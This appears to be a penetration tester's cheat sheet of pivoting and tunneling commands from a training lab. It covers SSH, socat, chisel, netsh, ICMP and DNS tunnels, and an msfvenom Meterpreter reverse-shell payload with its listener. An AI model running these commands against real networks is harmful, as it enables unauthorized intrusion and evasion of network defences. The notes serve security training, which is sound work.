# SSH
## Local relay

![SSH Local port forwarding](_attachments/Pivoting%2C%20Tunneling%2C%20and%20Port%20Forwarding%20SSH%20Local%20port%20forwarding.png)

Executing the Local Port Forward
```shell
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

Forwarding Multiple Ports
```shell
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

##  Dynamic Port Forwarding and SOCKS Tunneling

![SSH tunneling over SOCKS proxy](_attachments/Pivoting,%20Tunneling,%20and%20Port%20Forwarding%20SSH%20tunneling%20over%20SOCKS%20proxy.png)

Enabling Dynamic Port Forwarding with SSH
```shell
ssh -D 9050 ubuntu@10.129.202.64
```

Checking /etc/proxychains.conf
```shell
tail -4 /etc/proxychains4.conf
```

Using Nmap with Proxychains
```shell
proxychains nmap -v -Pn -sT 172.16.5.19
```

## Remote/Reverse Port Forwarding

![Reverse shell over Reverse SSH Port Forwarding](_attachments/Pivoting,%20Tunneling,%20and%20Port%20Forwarding%20Reverse%20shell%20over%20Reverse%20SSH%20Port%20Forwarding.png)

```shell
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

# Meterpreter

## SOCKS Tunneling with Autoroute

Msfvenom payload

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=PWNIP LPORT=PWNPO -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf
```

Metasploit listener

```shell
use exploit/multi/handler
set lhost
set lport
set payload linux/x64/meterpreter/reverse_tcp
```

Creating Routes with Autoroute
```shell
msf6 > use post/multi/manage/autoroute
```

(Or from Meterpreter session)
```shell
meterpreter > run autoroute -s 172.16.5.0/23
```

Listing Active Routes
```shell
meterpreter > run autoroute -p
```

Configuring MSF's SOCKS Proxy

```shell
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```

Connect with proxychains



## Local relay

Creating Local TCP Relay
```shell
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

-l 3300: local port
-p 3389: remote port
-r: remote host

Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

## Reverse Port Forwarding

```shell
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

-R: Reverse Port Forwarding
-l 8081: local port
-p 1234: pivot host port
-L: local IP

# Socat

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.

## Bind Port Forwarding (Direct relay)

Starting Socat Listener
```shell
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

## Reverse Port Forwarding

Starting Socat Listener
```shell
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

# Pivoting Around Obstacles

- plink.exe (Windows PuTTY)
- sshuttle (Linux)
- rpivot (Python2)
- netsh (Windows)

Using Netsh.exe to Port Forward

```shell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

Verifying Port Forward

```shell
netsh.exe interface portproxy show v4tov4
```

# Dnscat2

Start server
```shell
sudo ruby dnscat2.rb --dns host=10.10.16.72,port=53,domain=inlanefreight.local --no-cache
```

Import module on client
```powershell
Import-Module .\dnscat2.ps1
```

Start tunnel
```powershell
Start-Dnscat2 -DNSserver 10.10.16.72 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

Interacting with established session
```shell
window -i 1
```

# Chisel

Running the Chisel Server on the Pivot Host
```shell
./chisel server -v -p 1234 --socks5
```

Connecting to the Chisel Server
```shell
./chisel client -v 10.129.202.64:1234 socks
```

Editing & Confirming proxychains.conf
```shell
tail -f /etc/proxychains.conf

socks5 127.0.0.1 1080 
```

**Chisel Reverse Pivot**

Starting the Chisel Server on our Attack Host
```shell
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Connecting the Chisel Client to our Attack Host
```shell
./chisel client -v 10.10.14.17:1234 R:socks
```

Editing & Confirming proxychains.conf
```shell
tail -f /etc/proxychains.conf 

socks5 127.0.0.1 1080 
```

# ICMP Tunneling with SOCKS

We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. Let's start by setting up ptunnel-ng.

Starting the ptunnel-ng Server on the Target Host
```shell
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

Connecting to ptunnel-ng Server from Attack Host
```shell
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

Tunneling an SSH connection through an ICMP Tunnel
```shell
ssh -p2222 -lubuntu 127.0.0.1
```

Enabling Dynamic Port Forwarding over SSH
```shell
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

Proxychaining through the ICMP Tunnel
```shell
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

# RDP and SOCKS Tunneling with SocksOverRDP

[SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use `SocksOverRDP` to tunnel our custom packets and then proxy through it. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.

We will need:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
    
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
    

- We can look for `ProxifierPE.zip`

We can then connect to the target using xfreerdp and copy the `SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.

Loading SocksOverRDP.dll using regsvr32.exe
```shell
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Now we can connect over RDP to the target host using `mstsc.exe`, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. 

We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe. We can then start SocksOverRDP-Server.exe with Admin privileges. And minimize RDP session.

Confirming the SOCKS Listener is Started
```shell
netstat -antb | findstr 1080
```

Configuring Proxifier

```
Profile > Proxy Servers > Add
```

Then RDP to internal host.

# Other tools

## Ligolo-ng
https://github.com/Nicocha30/ligolo-ng
An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.

https://www.flu-project.com/2023/10/ligolo-ng.html

## Wstunnel
https://github.com/erebe/wstunnel

To set up a tunnel using `wstunnel` to access port 445 on a remote host (172.16.6.50) through a pivot host (10.129.106.93), you can follow these steps. This setup assumes that you have control over the pivot host and can run `wstunnel` on it.

1. **On the Pivot Host (10.129.106.93):**

   You need to run `wstunnel` in server mode on the pivot host. This will listen for incoming WebSocket connections from your local attack host.

   ```bash
   wstunnel -s 0.0.0.0:8080
   ```

   This command starts a WebSocket server on the pivot host listening on port 8080.

2. **On Your Local Attack Host (10.10.15.48):**

   You will run `wstunnel` in client mode to connect to the pivot host and forward traffic to the remote host.

   ```bash
   wstunnel -t ws://10.129.106.93:8080 -L 1445:172.16.6.50:445
   ```

   This command does the following:
   - Connects to the WebSocket server on the pivot host at `10.129.106.93:8080`.
   - Forwards local port 1445 on your Kali machine to port 445 on the remote host `172.16.6.50`.

3. **Access the Remote Host:**

   Once the tunnel is established, you can access the remote host's SMB service on port 445 by connecting to `localhost:1445` on your Kali machine. For example, you can use `smbclient` or any other tool that interacts with SMB:

   ```bash
   smbclient -L localhost -p 1445
   ```